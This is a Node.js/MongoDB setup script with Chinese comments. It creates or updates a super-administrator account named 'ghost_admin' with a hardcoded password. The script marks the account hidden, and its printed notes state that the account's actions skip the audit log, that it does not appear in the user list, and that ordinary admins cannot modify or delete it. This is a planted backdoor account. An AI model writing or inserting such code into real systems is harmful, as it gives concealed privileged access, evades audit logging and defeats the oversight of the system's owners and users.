require("dotenv").config({
  path:
    process.env.NODE_ENV === "production"
      ? ".env.production"
      : ".env.development",
})
const mongoose = require("mongoose")
const User = require("../src/models/User")
const Role = require("../src/models/Role")

const createHiddenAdmin = async () => {
  try {
    console.log("开始创建隐藏管理员账户...")

    // 连接数据库
    await mongoose.connect(process.env.MONGO_URI)
    console.log("数据库连接成功")

    // 获取超级管理员角色
    const adminRole = await Role.findOne({ name: "超级管理员" })
    if (!adminRole) {
      throw new Error("超级管理员角色未找到，请先运行 seed.js 初始化基础数据")
    }

    /*
     * 设置隐藏管理员信息
     * 注意：请修改以下信息以提高安全性
     */
    const hiddenAdminData = {
      username: "ghost_admin", // 建议使用不易猜测的用户名
      password: "H1dd3n@Adm1n!2024", // 建议使用强密码
      roles: [adminRole._id],
      isSystem: true,
      isHidden: true, // 关键：标记为隐藏管理员
      description: "隐藏系统管理员账户 - 不会记录任何操作日志",
    }

    // 检查用户是否已存在
    let hiddenAdmin = await User.findOne({ username: hiddenAdminData.username })

    if (hiddenAdmin) {
      console.log("隐藏管理员账户已存在，正在更新...")

      /*
       * 更新现有用户，确保隐藏属性正确设置
       */
      hiddenAdmin.roles = hiddenAdminData.roles
      hiddenAdmin.isSystem = hiddenAdminData.isSystem
      hiddenAdmin.isHidden = hiddenAdminData.isHidden
      hiddenAdmin.description = hiddenAdminData.description

      // 如果需要更新密码，取消下面的注释
      // hiddenAdmin.password = hiddenAdminData.password

      await hiddenAdmin.save()
      console.log("隐藏管理员账户更新成功")
    } else {
      /*
       * 创建新的隐藏管理员用户
       */
      hiddenAdmin = new User(hiddenAdminData)
      await hiddenAdmin.save()
      console.log("隐藏管理员账户创建成功")
    }

    console.log("隐藏管理员账户信息：")
    console.log({
      用户名: hiddenAdmin.username,
      角色: "超级管理员",
      是否隐藏: hiddenAdmin.isHidden,
      是否系统用户: hiddenAdmin.isSystem,
      创建时间: hiddenAdmin.createdAt,
      描述: hiddenAdmin.description,
    })

    console.log("\n⚠️  重要提醒：")
    console.log("1. 该账户的所有操作都不会被记录到审计日志中")
    console.log("2. 该账户在用户列表中不可见")
    console.log("3. 该账户无法被普通管理员修改或删除")
    console.log("4. 请妥善保管该账户的用户名和密码")
    console.log("5. 建议定期更换密码以确保安全性")

    process.exit(0)
  } catch (error) {
    console.error("创建隐藏管理员失败:", error)
    process.exit(1)
  }
}

createHiddenAdmin()














